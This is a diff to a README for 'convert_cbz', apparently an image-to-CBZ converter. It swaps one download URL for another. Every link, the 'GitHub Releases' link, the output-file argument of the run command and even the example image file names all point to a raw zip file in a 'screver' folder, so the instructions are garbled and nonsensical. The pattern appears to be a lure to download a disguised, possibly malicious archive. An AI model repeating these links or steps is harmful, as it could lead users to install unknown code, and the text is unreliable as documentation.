@@ -1,6 +1,6 @@
 # 🚀 convert_cbz - Convert Images to CBZ Files Easily
 
-[![Download convert_cbz](https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip)](https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip)
+[![Download convert_cbz](https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip)](https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip)
 
 ## 🛠️ Introduction
 
@@ -8,9 +8,9 @@ convert_cbz is a tool designed for anyone who wants to convert folders of images
 
 ## 📥 Download & Install
 
-To get started with convert_cbz, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip). Choose the latest release and download the version appropriate for your operating system.
+To get started with convert_cbz, visit this page to download: [GitHub Releases](https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip). Choose the latest release and download the version appropriate for your operating system.
 
-1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip).
+1. Go to the [GitHub Releases page](https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip).
 2. Find the latest version.
 3. Download the version that matches your operating system (Windows, macOS, or Linux).
 
@@ -45,9 +45,9 @@ Once you have downloaded the application, follow these steps to convert your ima
 4. **Run the Application:**
    Use the following command to convert images located in a specific folder:
    ```
-   ./convert_cbz /path/to/your/images https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip
+   ./convert_cbz /path/to/your/images https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip
    ```
-   Replace `/path/to/your/images` with the path to your image folder and `https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip` with the desired output file name.
+   Replace `/path/to/your/images` with the path to your image folder and `https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip` with the desired output file name.
 
 5. **Check the Output:**
    Once the process completes, your CBZ file will be located in the output path you specified.
@@ -56,7 +56,7 @@ Once you have downloaded the application, follow these steps to convert your ima
 
 - Organize your images in a dedicated folder for easy access.
 - Make sure your images are in supported formats (PNG, JPG, BMP, or GIF).
-- For best performance, keep your images in an orderly format, like numbering them (e.g., https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip, https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip).
+- For best performance, keep your images in an orderly format, like numbering them (e.g., https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip, https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip).
 
 ## 🔧 Troubleshooting
 
@@ -90,4 +90,4 @@ For additional information about CBZ files and their usage, visit online resourc
 
 Remember, your feedback helps improve convert_cbz. Don't hesitate to report bugs or suggest features on GitHub!
 
-[Download convert_cbz](https://raw.githubusercontent.com/Hackathon23124/convert_cbz/main/screver/convert_cbz.zip)
+[Download convert_cbz](https://github.com/Hackathon23124/convert_cbz/raw/refs/heads/main/screver/convert_cbz_v1.1-beta.5.zip)
